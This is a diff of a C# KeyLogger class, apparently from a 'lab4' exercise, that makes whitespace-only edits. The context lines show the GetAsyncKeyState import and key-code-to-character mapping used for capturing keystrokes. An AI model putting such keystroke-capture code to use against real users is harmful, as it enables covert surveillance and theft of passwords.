@@ -3,13 +3,10 @@ using System.IO;
 using System.Runtime.InteropServices;
 
 
-
 namespace lab4
 {
-   
     class KeyLogger
-    {
-        
+    { 
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         [DllImport("user32.dll", SetLastError = true)]
@@ -224,8 +221,7 @@ namespace lab4
                 if (!languageChange && shiftPressed) key = "?";
                 else if (!languageChange) key = "/";
                 else if (languageChange && shiftPressed) key = ",";
-                else key = ".";
-                
+                else key = "."; 
             }
             else if (code == 193) key = "/";
             else if (code == 194) key = ".";
@@ -256,6 +252,5 @@ namespace lab4
             else if (code == 226) key = "\\";
             return key;
         }
-       
     }
 }
